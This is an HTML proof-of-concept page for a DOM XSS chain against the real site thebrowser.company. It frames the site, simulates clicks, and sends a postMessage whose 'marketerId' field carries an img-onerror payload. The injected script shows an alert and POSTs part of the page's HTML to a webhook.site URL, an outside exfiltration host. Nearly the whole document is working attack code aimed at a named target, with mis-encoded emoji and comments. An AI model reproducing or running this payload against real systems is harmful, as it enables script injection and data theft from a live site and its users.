<!DOCTYPE html>
<html>
<head>
  <title>ğŸ”¥ Final XSS Chain PoC</title>
  <meta charset="utf-8">
  <style>
    body { font-family: sans-serif; background: #111; color: #eee; padding: 30px; }
    iframe { border: 2px solid #444; width: 100%; height: 500px; margin-top: 20px; }
  </style>
</head>
<body>
  <h1>â˜ ï¸ DOM XSS Chain on thebrowser.company</h1>
  <p>Exploiting postMessage â†’ React injection â†’ CSP bypass â†’ DOM access</p>

  <iframe id="target" src="https://thebrowser.company/" sandbox="allow-scripts allow-same-origin allow-forms"></iframe>

  <script>
    const payload = `<img src=x onerror="(() => {
      document.body.click?.();
      document.body.focus?.();
      alert('ğŸ”¥ XSS triggered!');
      fetch('https://webhook.site/your-id', {
        method: 'POST',
        mode: 'no-cors',
        body: document.documentElement.innerHTML.slice(0, 1000)
      });
    })()">`;

    const message = {
      message: "OB_SHOULD_SHOW_PICKER",
      content: {
        marketerId: [payload]
      }
    };

    const iframe = document.getElementById("target");

    iframe.onload = () => {
      console.log("âœ… iframe loaded");

      // ØªØ­Ø§ÙŠÙ„ Ø¹Ù„Ù‰ ØªÙØ§Ø¹Ù„ Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…: dispatchEvent + click/focus
      setTimeout(() => {
        const event = new Event("click");
        document.body.dispatchEvent(event);

        console.log("ğŸš€ Sending postMessage payload...");
        iframe.contentWindow.postMessage(message, "*");
      }, 1000);
    };
  </script>
</body>
</html>
